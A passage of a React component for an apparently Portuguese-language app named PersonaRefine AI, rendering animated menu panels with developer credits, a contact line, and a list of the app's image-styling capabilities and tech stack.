                    </div>
                  </motion.div>
                ) : activeMenuSection === "criador" ? (
                  <motion.div key="criador-info" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="flex flex-col overflow-y-auto scrollbar-hide">
                    <div className="w-10 h-10 bg-orange-500/10 rounded-2xl flex items-center justify-center border border-orange-500/20 mb-4 shrink-0"><User className="w-5 h-5 text-orange-500" /></div>
                    <h3 className="text-lg font-bold tracking-tighter mb-3 shrink-0">Desenvolvimento</h3>
                    <p className="text-[11px] text-white/60 leading-relaxed mb-4">PersonaRefine AI foi concebido e desenvolvido por <span className="text-orange-500">Leoclécio Ambrosio</span>.</p>
                    <div className="space-y-3 mb-6">
                      <div>
                        <span className="block text-[8px] tracking-widest text-white/20 mb-1">Contato</span>
                        <div className="flex items-center gap-2">
                          <WhatsAppIcon className="w-3 h-3 text-orange-500" />
                          <p className="text-[10px] text-white/50">WhatsApp: (15) 99256-8868</p>
                        </div>
                      </div>
                      <div>
                        <span className="block text-[8px] tracking-widest text-white/20 mb-1">Missão</span>
                        <p className="text-[10px] text-white/50 leading-relaxed">Democratizar o acesso a ferramentas de estética visual de alto nível, unindo inteligência artificial e direção de arte.</p>
                      </div>
                    </div>
                    <div className="pt-4 border-t border-white/5 mt-auto">
                      <div className="flex items-center justify-between text-[8px] tracking-widest text-white/20">
                        <span>Versão</span><span className="text-orange-500/50">1.0.4 Stable</span>
                      </div>
                    </div>
                  </motion.div>
                ) : (
                  <motion.div key="funcoes-info" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="flex flex-col overflow-y-auto scrollbar-hide">
                    <div className="w-10 h-10 bg-orange-500/10 rounded-2xl flex items-center justify-center border border-orange-500/20 mb-4 shrink-0"><Cpu className="w-5 h-5 text-orange-500" /></div>
                    <h3 className="text-lg font-bold tracking-tighter mb-4 shrink-0">Capacidades do Sistema</h3>
                    <div className="space-y-6 pb-4">
                      {[
                        { n: "01", title: "Análise de Referência", desc: "O sistema decompõe imagens de referência em metadados técnicos, identificando esquemas de iluminação, profundidade de campo e composição." },
                        { n: "02", title: "Engenharia de Prompt", desc: "Traduz conceitos visuais subjetivos em linguagem de máquina otimizada, utilizando termos técnicos de fotografia e cinema." },
                        { n: "03", title: "Transformação de Estilo", desc: "Aplica o \"Style Transfer\" avançado, onde a estrutura facial do usuário é preservada enquanto o ambiente é reconstruído." },
                        { n: "04", title: "Processamento Gemini", desc: "Utiliza a arquitetura multimodal do Gemini para entender nuances contextuais e garantir fidelidade visual." }
                      ].map(item => (
                        <div key={item.n} className="group">
                          <div className="flex items-center gap-2 mb-1">
                            <span className="text-[9px] font-bold text-orange-500/50">{item.n}</span>
                            <span className="text-[9px] font-bold tracking-widest text-white/80">{item.title}</span>
                          </div>
                          <p className="text-[10px] text-white/40 leading-relaxed pl-5">{item.desc}</p>
                        </div>
                      ))}
                      <div className="pt-2">
                        <span className="block text-[8px] tracking-widest text-white/20 mb-2">Stack Tecnológico</span>
                        <div className="flex flex-wrap gap-1.5">
                          {["Gemini Flash", "Vision API", "React", "Tailwind"].map(tech => (
                            <span key={tech} className="px-1.5 py-0.5 bg-white/5 border border-white/10 rounded text-[7px] tracking-widest text-white/30">{tech}</span>
                          ))}
                        </div>
                      </div>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>
          </>
        )}
      </AnimatePresence>
    </div>
  );
}
